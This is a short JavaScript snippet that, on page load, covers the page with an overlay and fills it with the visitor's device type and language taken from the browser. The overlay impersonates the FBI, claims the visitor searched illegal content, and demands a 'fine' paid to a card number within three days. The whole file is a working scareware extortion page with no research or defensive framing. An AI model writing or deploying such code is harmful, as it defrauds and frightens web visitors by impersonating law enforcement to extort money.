window.addEventListener("load", function() {
	(function() {
		let overlay = document.createElement("div");
		overlay.classList.add("overlay");
		overlay.cssText = "width: 100vw; height: 100vh; position: fixed; z-index: 10000;";
		let tempStr = navigator.userAgent + "";
		function determineDevice() {
			if(tempStr.match("Android")) {
				return "Android";
			}else if(tempStr.match("iPhone")) {
				return "iPhone";
			}else if(tempStr.match("Win64")) {
				return "Windows";
			}
		}
		let personalData = {};
		personalData.language = navigator.language;
		personalData.device = determineDevice();
		console.log(personalData.device);
		overlay.innerHTML = "You've been banned by the FBI for searching illegal content. We know everything about you. You are from "+ personalData.language.slice(3) +" Right now you're using "+ personalData.device +". Pay the official fine to the credit card: 2323 7238 3782 1008 within 3 days or else...";
		document.body.appendChild(overlay);
	})();
});

